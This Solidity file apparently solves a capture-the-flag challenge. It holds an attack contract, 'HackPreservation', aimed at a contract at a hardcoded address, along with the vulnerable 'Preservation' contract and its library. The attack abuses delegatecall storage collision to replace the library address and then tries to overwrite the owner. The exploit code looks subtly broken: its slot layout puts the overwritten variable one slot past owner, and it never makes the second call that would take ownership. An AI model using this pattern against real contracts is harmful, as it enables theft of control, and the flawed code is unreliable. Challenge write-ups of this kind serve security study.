// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version


import '../contracts/Preservation.sol';


contract HackPreservation {
    Preservation public originalContract = Preservation(0xB14b76edf0eb81e58744889C88726c470D1977A0);
    address notUsed;
    address notUsed2;
    address toOverride;

    function hack(address myContractAddress) public {
        originalContract.setFirstTime(uint256(uint160(myContractAddress)));
    }

    function setTime(uint _time) public {
        toOverride = address(uint160(_time));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}